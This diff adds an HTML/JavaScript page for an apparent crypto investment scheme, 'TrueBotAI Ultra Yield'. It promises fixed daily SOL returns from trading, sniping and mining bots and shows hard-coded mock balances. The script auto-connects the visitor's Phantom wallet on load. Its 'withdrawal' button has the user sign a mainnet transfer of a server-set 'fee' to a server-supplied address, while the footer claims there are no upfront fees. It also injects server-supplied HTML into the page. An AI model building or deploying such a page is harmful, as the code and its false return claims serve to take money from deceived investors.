@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>TrueBotAI Ultra Yield Dashboard</title>
+  <style>
+    /* CSS for the main layout */
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Roboto&display=swap');
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: #0a0f1a;
+      color: #cbd5e1;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+    header {
+      background: #111827;
+      padding: 1rem 2rem 0.5rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      border-bottom: 2px solid #f59e0b;
+      box-shadow: 0 0 15px #f59e0b;
+      color: #f59e0b;
+    }
+    header h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-weight: 500;
+      font-size: 1.8rem;
+      letter-spacing: 2px;
+      margin: 0;
+    }
+    header .fee-notice {
+      font-family: 'Roboto', sans-serif;
+      font-size: 0.9rem;
+      margin-top: 0.3rem;
+      color: #fbbf24;
+    }
+    button.connect-wallet {
+      background: #f59e0b;
+      border: none;
+      padding: 0.6rem 1.3rem;
+      border-radius: 25px;
+      color: #0a0f1a;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      font-family: 'Orbitron', sans-serif;
+      margin: 1rem 0;
+    }
+    button.connect-wallet:hover { background: #d97706; }
+    nav { margin-top: 1rem; display: flex; justify-content: center; gap: 2rem; flex-wrap: wrap; }
+    nav button {
+      background: transparent;
+      border: none;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1rem;
+      color: #fbbf24;
+      cursor: pointer;
+      padding: 0.5rem 1rem;
+      border-radius: 12px;
+      transition: background 0.3s ease, color 0.3s ease;
+      letter-spacing: 1px;
+      min-width: 110px;
+      text-align: center;
+    }
+    nav button.active, nav button:hover {
+      background: #f59e0b;
+      color: #0a0f1a;
+      box-shadow: 0 0 8px #f59e0b;
+    }
+    main { max-width: 960px; margin: 2rem auto; padding: 0 1rem; }
+    .section {
+      background: #1e293b;
+      border-radius: 12px;
+      padding: 2rem;
+      box-shadow: 0 0 20px #11182788;
+      margin-bottom: 2rem;
+      transition: box-shadow 0.3s ease;
+    }
+    .section:hover { box-shadow: 0 0 30px #f59e0bcc; }
+    h2 {
+      font-family: 'Orbitron', sans-serif;
+      color: #fbbf24;
+      margin-top: 0;
+      margin-bottom: 1rem;
+      letter-spacing: 1.5px;
+    }
+    .card-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit,minmax(320px,1fr));
+      gap: 1.5rem;
+    }
+    .card {
+      background: #111827;
+      border-radius: 10px;
+      padding: 1.2rem;
+      box-shadow: inset 0 0 8px #f59e0baa;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      min-height: 320px;
+      color: #fcd34d;
+    }
+    .card h3 {
+      margin: 0 0 0.6rem 0;
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 1px;
+      font-weight: 700;
+      color: #fbbf24;
+    }
+    .card p { flex-grow: 1; font-size: 0.9rem; color: #fde68acc; margin-bottom: 1rem; }
+    .earnings { font-size: 0.9rem; margin-bottom: 1rem; line-height: 1.4; }
+    .earnings span { display: block; font-weight: 600; }
+    .min-invest { font-size: 0.95rem; font-weight: 700; color: #fbbf24; margin-bottom: 1rem; }
+    .card button {
+      background: #f59e0b;
+      border: none;
+      padding: 0.6rem 1rem;
+      border-radius: 20px;
+      font-family: 'Orbitron', sans-serif;
+      font-weight: 700;
+      color: #0a0f1a;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      align-self: flex-start;
+    }
+    .card button:hover { background: #d97706; }
+    footer {
+      text-align: center;
+      color: #fbbf24;
+      font-size: 0.9rem;
+      padding: 1.5rem 0;
+      letter-spacing: 1px;
+      border-top: 1px solid #f59e0b;
+    }
+
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.8);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background-color: #1e293b;
+      margin: auto;
+      padding: 2rem;
+      border: 1px solid #f59e0b;
+      border-radius: 12px;
+      width: 80%;
+      max-width: 500px;
+      text-align: center;
+      position: relative;
+    }
+    .close-button {
+      color: #aaa;
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      font-size: 28px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .close-button:hover, .close-button:focus {
+      color: white;
+      text-decoration: none;
+    }
+    .address-box {
+      background: #111827;
+      padding: 0.8rem;
+      border-radius: 8px;
+      margin-top: 1rem;
+      word-break: break-all;
+    }
+    .address-box button {
+      background: #f59e0b;
+      border: none;
+      padding: 0.4rem 0.8rem;
+      border-radius: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-left: 0.5rem;
+    }
+    .content-container {
+      /* Add styling for content */
+      display: none;
+    }
+    /* New styling for the portfolio section */
+    .portfolio-summary {
+        background: #111827;
+        border-radius: 10px;
+        padding: 1.2rem;
+        box-shadow: inset 0 0 8px #f59e0baa;
+    }
+    .portfolio-summary h3 {
+        color: #fbbf24;
+    }
+    .portfolio-summary .stat-item {
+        margin-bottom: 1rem;
+    }
+    .portfolio-summary .stat-item span {
+        font-weight: 700;
+        color: #fcd34d;
+    }
+    #withdrawalBtn {
+        background: #f59e0b;
+        border: none;
+        padding: 0.6rem 1rem;
+        border-radius: 20px;
+        font-family: 'Orbitron', sans-serif;
+        font-weight: 700;
+        color: #0a0f1a;
+        cursor: pointer;
+        transition: background 0.3s ease;
+    }
+    #withdrawalBtn:hover {
+        background: #d97706;
+    }
+    #withdrawalBtn:disabled {
+        background: #525252;
+        cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1>TrueBotAI Ultra Yield</h1>
+  <div class="fee-notice">Performance Fee: <strong>20% of net profits</strong> only</div>
+  <button class="connect-wallet">Connect Wallet</button>
+</header>
+
+<nav>
+  <button class="active" data-section="trading">Ultra Trading Bots</button>
+  <button data-section="sniping">Extreme Sniping</button>
+  <button data-section="staking">Yield Farming</button>
+  <button data-section="mining">Quantum Mining</button>
+  <button data-section="portfolio">Portfolio Overview</button>
+</nav>
+
+<main>
+  <section id="trading" class="section">
+    <h2>Ultra Trading Bots</h2>
+    <div class="card-grid">
+      <div class="card" data-cid="QmYc7Fk2WwYj6k9N4d5qZ1a8sX3gH7P4t1L7e8sR2o3lV4e">
+        <h3>Leverage Trading Bot</h3>
+        <p>Utilizes margin and algorithmic trading for ultra-high returns. Suitable only for experienced investors.</p>
+        <div class="earnings">
+          <span>Daily: 4.0 SOL (~$120)</span>
+          <span>Monthly: 120 SOL (~$3,600)</span>
+          <span>Yearly: 1440 SOL (~$43,200)</span>
+        </div>
+        <div class="min-invest">Minimum Investment: 300 SOL (~$9,000)</div>
+        <button class="activate-btn">Activate</button>
+      </div>
+      <div class="card" data-cid="QmVWz7gJ2wP5qK9Xn2bT7sC8hA4dE5fF3rG9jH1mK5eL7t">
+        <h3>Ultra Aggressive Bot</h3>
+        <p>High-frequency leveraged trading targeting maximum returns. Expect volatility and risk.</p>
+        <div class="earnings">
+          <span>Daily: 1.5 SOL (~$45)</span>
+          <span>Monthly: 45 SOL (~$1,350)</span>
+          <span>Yearly: 540 SOL (~$16,200)</span>
+        </div>
+        <div class="min-invest">Minimum Investment: 120 SOL (~$3,600)</div>
+        <button class="activate-btn">Activate</button>
+      </div>
+    </div>
+  </section>
+
+  <section id="sniping" class="section" style="display:none;">
+    <h2>Extreme Sniping</h2>
+    <div class="card-grid">
+      <div class="card" data-cid="QmQf6Lz9d5pX2zK8rN3hF1uE4tJ7cW9aA8sH6pY1eM4bN">
+        <h3>Extreme Sniper Pro</h3>
+        <p>Lightning-fast token & NFT sniping, capturing the best launches with high volatility.</p>
+        <div class="earnings">
+          <span>Daily: 3.0 SOL (~$90)</span>
+          <span>Monthly: 90 SOL (~$2,700)</span>
+          <span>Yearly: 1080 SOL (~$32,400)</span>
+        </div>
+        <div class="min-invest">Minimum Investment: 250 SOL (~$7,500)</div>
+        <button class="activate-btn">Configure & Launch</button>
+      </div>
+    </div>
+  </section>
+
+  <section id="staking" class="section" style="display:none;">
+    <h2>Yield Farming</h2>
+    <div class="card-grid">
+      <div class="card" data-cid="QmSg6yK2xR1zP8aN3lH5cM9dF7oE2wT4jU6qV3fD1eW0g">
+        <h3>Yield Farming Master</h3>
+        <p>Multi-protocol yield farming with compounding strategies for optimal returns.</p>
+        <div class="earnings">
+          <span>Daily: 1.8 SOL (~$54)</span>
+          <span>Monthly: 54 SOL (~$1,620)</span>
+          <span>Yearly: 648 SOL (~$19,440)</span>
+        </div>
+        <div class="min-invest">Minimum Investment: 180 SOL (~$5,400)</div>
+        <button class="activate-btn">Stake Now</button>
+      </div>
+    </div>
+  </section>
+
+  <section id="mining" class="section" style="display:none;">
+    <h2>Quantum Mining</h2>
+    <div class="card-grid">
+      <div class="card" data-cid="QmPz4wD2xQ1zE7tB9uJ5cM6aD8eS3gG7hH9jK0lV1pY5o">
+        <h3>Quantum Mining Elite</h3>
+        <p>Next-gen mining contracts with dynamic ROI and premium hash power.</p>
+        <div class="earnings">
+          <span>Daily: 2.5 SOL (~$75)</span>
+          <span>Monthly: 75 SOL (~$2,250)</span>
+          <span>Yearly: 900 SOL (~$27,000)</span>
+        </div>
+        <div class="min-invest">Minimum Investment: 200 SOL (~$6,000)</div>
+        <button class="activate-btn">Buy Contract</button>
+      </div>
+    </div>
+  </section>
+
+  <section id="portfolio" class="section" style="display:none;">
+    <h2>Portfolio Overview</h2>
+    <div class="portfolio-summary">
+      <p>Your investments summary, profit & loss, and withdrawal options will appear here.</p>
+      <!-- Example mock data for profit and loss. In a real app, this would be dynamic -->
+      <div class="stat-item">
+        <h3>Current Balance:</h3>
+        <span id="currentBalance">200.00 SOL</span>
+      </div>
+      <div class="stat-item">
+        <h3>Total Profits:</h3>
+        <span id="totalProfits">50.00 SOL</span>
+      </div>
+      <button id="withdrawalBtn">Initiate Withdrawal</button>
+    </div>
+  </section>
+</main>
+
+<footer>
+  Performance Fee: <strong>20% of net profits</strong> — No upfront or hidden fees.
+</footer>
+
+<!-- The Modal for payment or messages -->
+<div id="paymentModal" class="modal">
+  <div class="modal-content">
+    <span class="close-button">&times;</span>
+    <h3 id="modalTitle"></h3>
+    <div id="modalBody"></div>
+  </div>
+</div>
+
+<!-- Solana Web3 Library -->
+<script src="https://unpkg.com/@solana/web3.js@1.78.5/lib/index.iife.js"></script>
+
+<script>
+  // Helper function for the custom modal
+  const paymentModal = document.getElementById('paymentModal');
+  const modalTitle = document.getElementById('modalTitle');
+  const modalBody = document.getElementById('modalBody');
+  const closeButton = document.querySelector('.close-button');
+
+  closeButton.onclick = () => {
+    paymentModal.style.display = 'none';
+  };
+  window.onclick = (event) => {
+    if (event.target == paymentModal) {
+      paymentModal.style.display = 'none';
+    }
+  };
+
+  /**
+   * Displays a custom modal with a title and message.
+   * @param {string} title The title of the modal.
+   * @param {string} message The HTML content to display in the modal body.
+   */
+  const showModal = (title, message) => {
+    modalTitle.textContent = title;
+    modalBody.innerHTML = message;
+    paymentModal.style.display = 'flex';
+  };
+
+  // Main UI logic
+  const buttons = document.querySelectorAll('nav button');
+  const sections = document.querySelectorAll('main section');
+  const connectButton = document.querySelector('.connect-wallet');
+  const withdrawalBtn = document.getElementById('withdrawalBtn');
+
+  // Solana Web3 library and global vars
+  let userWallet = null;
+
+  // Phantom wallet logic
+  const connectWallet = async () => {
+    try {
+      if (window.solana && window.solana.isPhantom) {
+        const resp = await window.solana.connect();
+        userWallet = resp.publicKey;
+        console.log('Connected with public key:', userWallet.toString());
+        connectButton.textContent = 'Wallet Connected';
+      } else {
+        showModal('Wallet Not Found', '<p>Phantom wallet not found. Please install it to continue.</p>');
+      }
+    } catch (err) {
+      console.error('Wallet connection error:', err);
+      showModal('Connection Error', '<p>Failed to connect to wallet. Please try again.</p>');
+    }
+  };
+
+  // Auto-connect on page load
+  window.addEventListener('load', connectWallet);
+
+  // Manual connection via button
+  connectButton.addEventListener('click', connectWallet);
+
+  // Navigation buttons
+  buttons.forEach(btn => {
+    btn.addEventListener('click', () => {
+      buttons.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const target = btn.getAttribute('data-section');
+      sections.forEach(section => {
+        section.style.display = (section.id === target) ? 'block' : 'none';
+      });
+    });
+  });
+  
+  // Withdrawal Logic
+  withdrawalBtn.addEventListener('click', async () => {
+    if (!userWallet) {
+      showModal('Wallet Not Connected', '<p>Please connect your Phantom wallet first to initiate a withdrawal.</p>');
+      return;
+    }
+
+    // Get mock profit data from the UI. In a real app, this would be fetched from the backend.
+    const userProfitElement = document.getElementById('totalProfits');
+    const userProfit = parseFloat(userProfitElement.textContent);
+
+    if (isNaN(userProfit) || userProfit <= 0) {
+      showModal('No Profits to Withdraw', '<p>You do not have any profits to withdraw at this time.</p>');
+      return;
+    }
+    
+    showModal('Processing Withdrawal...', '<p>Calculating fee and preparing the transaction. Please approve the transaction in your Phantom wallet.</p>');
+
+    try {
+      // Step 1: Call the backend to get the fee details.
+      const response = await fetch('/api/withdraw', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userProfit: userProfit }),
+      });
+
+      if (!response.ok) {
+        throw new Error('Failed to get withdrawal details from the server.');
+      }
+      const data = await response.json();
+      const { address, feeAmount } = data;
+      const destinationAddress = new window.solanaWeb3.PublicKey(address);
+      const transactionFee = feeAmount; // The amount to be paid as a fee.
+
+      // Step 2: Create a Solana transaction.
+      const connection = new window.solanaWeb3.Connection(window.solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+      const transaction = new window.solanaWeb3.Transaction().add(
+        window.solanaWeb3.SystemProgram.transfer({
+          fromPubkey: userWallet,
+          toPubkey: destinationAddress,
+          lamports: transactionFee * window.solanaWeb3.LAMPORTS_PER_SOL, // Convert SOL to lamports
+        })
+      );
+
+      // Step 3: Prompt the user to sign and send the transaction with Phantom.
+      const { signature } = await window.solana.signAndSendTransaction(transaction);
+      
+      showModal('Transaction Submitted!', `
+        <p>Your withdrawal fee transaction has been submitted.</p>
+        <p><strong>Transaction Signature:</strong></p>
+        <div class="address-box">${signature}</div>
+        <p>You can check the status on the Solana block explorer.</p>
+      `);
+      
+      console.log('Transaction signature:', signature);
+
+    } catch (error) {
+      console.error('Withdrawal transaction error:', error);
+      showModal('Transaction Failed', `<p>An error occurred during the withdrawal. Please check your wallet and try again.</p><p>Error: ${error.message}</p>`);
+    }
+  });
+
+  // This is a placeholder for the IPFS content fetching logic.
+  // The original "activate-btn" is not part of the withdrawal logic
+  // anymore, so this is just for demonstration purposes.
+  document.querySelectorAll('.activate-btn').forEach(button => {
+    button.addEventListener('click', async (event) => {
+      const card = event.target.closest('.card');
+      const cid = card.getAttribute('data-cid');
+      const contentContainer = document.querySelector('.content-container');
+      
+      if (!cid) {
+        showModal('Error', '<p>No content ID (CID) found for this card.</p>');
+        return;
+      }
+      
+      showModal('Fetching Content...', `<p>Please wait while we fetch content from IPFS.</p>`);
+      
+      try {
+        const contentResponse = await fetch(`/api/ipfs/${cid}`);
+        if (!contentResponse.ok) {
+          throw new Error('Failed to fetch content from IPFS.');
+        }
+        const contentHtml = await contentResponse.text();
+        
+        // Hide the modal
+        paymentModal.style.display = 'none';
+
+        // Display the content
+        contentContainer.style.display = 'block';
+        const activeSection = document.querySelector('.section[style*="display: block"]');
+        if (activeSection) {
+          activeSection.innerHTML = contentHtml;
+        }
+
+      } catch (error) {
+        console.error('Error fetching IPFS content:', error);
+        showModal('Content Error', `<p>Failed to load content: ${error.message}.</p>`);
+      }
+    });
+  });
+</script>
+</body>
+</html>
